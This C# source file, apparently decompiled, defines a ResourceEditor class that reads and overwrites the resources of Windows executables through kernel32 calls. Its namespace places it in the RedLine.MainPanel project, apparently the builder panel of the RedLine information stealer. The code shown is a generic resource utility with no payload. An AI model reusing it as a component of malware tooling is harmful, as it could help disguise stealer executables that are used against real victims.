using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Runtime.InteropServices;
using RedLine.MainPanel.Models.Files;

namespace RedLine.MainPanel.Data.Files;

public class ResourceEditor
{
	private delegate bool EnumResourceProcedure(IntPtr module, ResourceType type, IntPtr name, IntPtr unused);

	private IntPtr intptr_0;

	private object object_0;

	public ResourceEditor(string filename)
	{
		if (!File.Exists(filename))
		{
			throw new FileNotFoundException(filename);
		}
		object_0 = filename;
	}

	public void SetResources(AssemblyResource[] resources)
	{
		IntPtr resources2 = BeginUpdateResource((string)object_0, overwrite: true);
		foreach (AssemblyResource assemblyResource in resources)
		{
			if (UpdateResource(resources2, assemblyResource.Type, assemblyResource.Name, 1033u, assemblyResource.Pointer, assemblyResource.Size) == (IntPtr)0)
			{
				throw new Win32Exception(Marshal.GetLastWin32Error());
			}
		}
		EndUpdateResource(resources2, cancel: false);
	}

	public AssemblyResource[] GetResources(params ResourceType[] types)
	{
		intptr_0 = LoadLibraryEx((string)object_0, (IntPtr)0, 35u);
		if (!(intptr_0 == (IntPtr)0))
		{
			List<AssemblyResource> manifests = new List<AssemblyResource>();
			EnumResourceProcedure enumerationProc = delegate(IntPtr module, ResourceType type, IntPtr name, IntPtr lparam)
			{
				IntPtr intPtr = default(IntPtr);
				intPtr = ((name.ToInt32() <= 1000) ? FindResource(module, name, type) : FindResource(module, Marshal.PtrToStringUni(name), type));
				IntPtr intPtr2 = SizeofResource(module, intPtr);
				IntPtr intPtr3 = LockResource(LoadResource(module, intPtr));
				if (intPtr3 != (IntPtr)0 && intPtr2 != (IntPtr)0)
				{
					AssemblyResource item = new AssemblyResource(intPtr3)
					{
						Type = type,
						Size = intPtr2,
						Name = name
					};
					manifests.Add(item);
				}
				FreeResource(intPtr3);
				return true;
			};
			foreach (ResourceType type2 in types)
			{
				EnumResourceNamesW(intptr_0, type2, enumerationProc, (IntPtr)0);
			}
			return manifests.ToArray();
		}
		throw new Exception("Could not load module: " + (string)object_0);
	}

	~ResourceEditor()
	{
		if (intptr_0 != (IntPtr)0)
		{
			FreeLibrary(intptr_0);
		}
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr BeginUpdateResource(string filename, bool overwrite);

	[DllImport("kernel32.dll")]
	private static extern IntPtr LoadLibraryEx(string filename, IntPtr unused, uint flags);

	[DllImport("kernel32.dll")]
	private static extern bool FreeLibrary(IntPtr module);

	[DllImport("kernel32.dll")]
	private static extern bool EnumResourceNamesW(IntPtr module, ResourceType type, EnumResourceProcedure enumerationProc, IntPtr unused);

	[DllImport("kernel32.dll")]
	private static extern IntPtr UpdateResource(IntPtr resources, ResourceType type, IntPtr name, uint language, IntPtr data, IntPtr length);

	[DllImport("kernel32.dll")]
	private static extern IntPtr EndUpdateResource(IntPtr resources, bool cancel);

	[DllImport("kernel32.dll")]
	private static extern IntPtr FindResource(IntPtr handle, IntPtr name, ResourceType type);

	[DllImport("kernel32.dll")]
	private static extern IntPtr FindResource(IntPtr handle, string name, ResourceType type);

	[DllImport("kernel32.dll")]
	private static extern IntPtr FreeResource(IntPtr dataptr);

	[DllImport("kernel32.dll")]
	private static extern IntPtr SizeofResource(IntPtr module, IntPtr resource);

	[DllImport("kernel32.dll")]
	private static extern IntPtr LoadResource(IntPtr module, IntPtr resource);

	[DllImport("kernel32.dll")]
	private static extern IntPtr LockResource(IntPtr data);
}
